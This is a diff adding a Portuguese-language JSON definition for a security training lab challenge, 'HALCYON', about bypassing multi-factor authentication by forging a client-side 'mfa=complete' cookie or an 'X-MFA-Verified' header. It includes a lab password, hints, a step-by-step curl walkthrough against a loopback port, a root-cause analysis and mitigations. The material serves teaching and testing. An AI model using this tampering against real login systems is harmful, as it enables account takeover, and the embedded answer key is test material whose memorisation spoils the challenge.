@@ -1,0 +1,35 @@
+{
+  "slug": "auth-mfa-bypass-response",
+  "title": "Quem decide sobre o MFA é o cliente",
+  "codename": "HALCYON",
+  "summary": "O Halcyon Workspace verifica a senha, pede um código de uso único e depois deixa o dashboard decidir se o MFA ocorreu lendo um cookie gravável pelo cliente ou um header X-MFA-Verified. Conclua o primeiro fator e complete o segundo por conta própria.",
+  "category": "auth",
+  "difficulty": "medium",
+  "kind": "challenge",
+  "lab_dir": "auth-mfa-bypass-response",
+  "estimated_minutes": 18,
+  "xp": 120,
+  "tech": ["Flask", "Cookies", "SSO", "MFA"],
+  "tags": ["mfa-bypass", "authentication", "cookie-tampering", "response-manipulation"],
+  "story": "O Halcyon opera o workspace de plantão de um time de plataforma. Depois da checagem de senha, o serviço de identidade entrega ao navegador um pequeno cookie `mfa` que começa em `required`; o dashboard promove o login pela metade a uma sessão real assim que esse cookie diz `complete`, porque o cliente desktop e o service worker nem sempre conseguem concluir a etapa do autenticador. A conta de operações no workspace guarda o segredo do cofre.",
+  "objective": "Faça login com a senha de admin, pule o segundo fator manipulando o estado de MFA no lado do cliente e chegue ao dashboard de operações para ler a flag.",
+  "rules": "Fique na origem loopback atribuída. Não faça brute force do código de uso único. As flags são dinâmicas.",
+  "flags": [
+    {"key": "flag", "label": "Segredo do cofre de operações", "flag_type": "user", "points": 120, "required": true, "requires_objective": true}
+  ],
+  "hints": [
+    {"level": 1, "title": "Olhe as respostas", "body": "Envie `username=ops&password=0perations!2026` via POST para `/login` e inspecione os headers `Set-Cookie`. Um deles se chama `mfa` e não é HttpOnly.", "cost": 10},
+    {"level": 2, "title": "Quem atesta o segundo fator?", "body": "Abra `/help/mfa`. O cookie e o header `X-MFA-Verified` são ambos descritos como sinais do cliente. Mude o valor do cookie de `required` para `complete` e requisite `/dashboard` com o mesmo handle `challenge`.", "cost": 10},
+    {"level": 3, "title": "Conclua o login", "body": "O dashboard responde com um cookie `sid` e um redirect. Siga-o com esse cookie de sessão; o workspace agora pertence ao admin e imprime o segredo do cofre.", "cost": 10}
+  ],
+  "solution": {
+    "walkthrough": "1. Conclua o primeiro fator com a senha de admin e capture os cookies:\n\n```bash\ncurl -i -c cookies.txt -d 'username=ops&password=0perations!2026' http://127.0.0.1:PORT/login\n# Set-Cookie: challenge=<HANDLE>; Set-Cookie: mfa=required\n```\n\n2. Peça o dashboard alegando que o MFA foi concluído:\n\n```bash\ncurl -i -b 'challenge=<HANDLE>; mfa=complete' http://127.0.0.1:PORT/dashboard\n# 302 /dashboard, Set-Cookie: sid=<SESSION>\n```\n\nA variante com header funciona da mesma forma: `curl -i -b 'challenge=<HANDLE>' -H 'X-MFA-Verified: true' http://127.0.0.1:PORT/dashboard`.\n\n3. Use a sessão emitida:\n\n```bash\ncurl -b 'sid=<SESSION>' http://127.0.0.1:PORT/dashboard\n```\n\nA página mostra `Workspace · ops` com role `admin` e imprime a flag. Um segundo cookie, sem MFA, é suficiente; o código de uso único nunca foi enviado.",
+    "root_cause": "A presença de um segundo fator concluído é decidida a partir de dados que o cliente controla. O servidor armazena o handle pendente do primeiro fator, mas depois confia em `mfa=complete` (um cookie não-HttpOnly) e no header `X-MFA-Verified` como prova de que a etapa do autenticador ocorreu, promovendo o handle a uma sessão completa. Um atacante que sabe a senha reenvia seu próprio handle com o valor modificado e nunca toca no código.",
+    "mitigation": "Mantenha o estado de autenticação inteiramente no lado do servidor: promova um challenge pendente somente quando o OTP for verificado no mesmo registro do servidor. Nunca aceite headers ou cookies que atestem um fato de autenticação. Se clientes precisarem sinalizar algo, assine o valor com uma chave do servidor e vincule-o ao challenge, e prefira IDs de sessão opacos de curta duração com os atributos `Secure`, `HttpOnly` e `SameSite`. Exija o segundo fator para toda sessão privilegiada e aplique rate limit nas tentativas de OTP."
+  },
+  "references": [
+    {"title": "CWE-287 — Improper Authentication", "url": "https://cwe.mitre.org/data/definitions/287.html", "source_type": "standard", "description": "Decisões de autenticação baseadas em dados que o atacante pode fornecer."},
+    {"title": "OWASP WSTG — Testing for Multi-Factor Authentication (WSTG-ATHN-11)", "url": "https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/04-Authentication_Testing/11-Testing_for_Multi-Factor_Authentication", "source_type": "standard", "description": "Verificações de que a etapa de MFA não pode ser contornada reenviando ou editando o estado da resposta."},
+    {"title": "HackTricks — MFA / 2FA bypasses", "url": "https://book.hacktricks.wiki/en/pentesting-web/login-bypass/index.html", "source_type": "research", "description": "Coletânea de técnicas de bypass de estado de autenticação no lado do cliente."}
+  ]
+}
